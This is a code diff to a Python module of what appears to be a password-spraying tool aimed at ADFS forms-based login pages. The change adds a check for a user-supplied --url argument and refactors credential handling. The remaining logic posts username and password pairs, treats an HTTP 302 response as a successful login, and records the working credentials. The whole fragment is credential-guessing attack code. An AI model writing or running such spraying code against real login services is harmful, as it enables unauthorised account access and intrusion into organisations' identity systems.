@@ -97,13 +97,20 @@ class ASModule(object):
                 logging.error(f"Invalid user: {user}")
                 return
 
+            # TODO: `url` needs to be filled in by the user as each ADFS instance is unique
+            # Validate  the user provided a target URL
+            if not self.args.url:
+                logging.error(f"Missing argument --url")
+                self.shutdown()
+
+            else:
+                url = self.args.url
+
             # Keep track of tested names in case we ctrl-c
-            self.tested_file.write(f"{user}:{password}")
+            creds = f"{user}:{password}"
+            self.tested_file.write(creds)
 
-            # TODO: `url` needs to be filled in by the user as each ADGS instance is unique
-            url      = self.args.url
             data     = f"UserName={user}&Password={password}&AuthMethod=FormsAuthentication"
-
             response = self._send_request(requests.post,
                                           url,
                                           data=data,
@@ -112,12 +119,12 @@ class ASModule(object):
             r_status = response.status_code
 
             if r_status == 302:
-                self.successful_results.append(f"{user}:{password}")
+                self.successful_results.append(creds)
                 logging.info(f"{text_colors.green}[ + ]{text_colors.reset} {user}:{password}")
                 self.users.remove(user)
 
             else:
-                print(f"{text_colors.red}[ - ]{text_colors.reset} {user}:{password}{gen_space(user)}", end='\r')
+                print(f"{text_colors.red}[ - ]{text_colors.reset} {user}:{password}{gen_space(creds)}", end='\r')
 
             # End template module code block logic.
             # --------------------------------------------------------
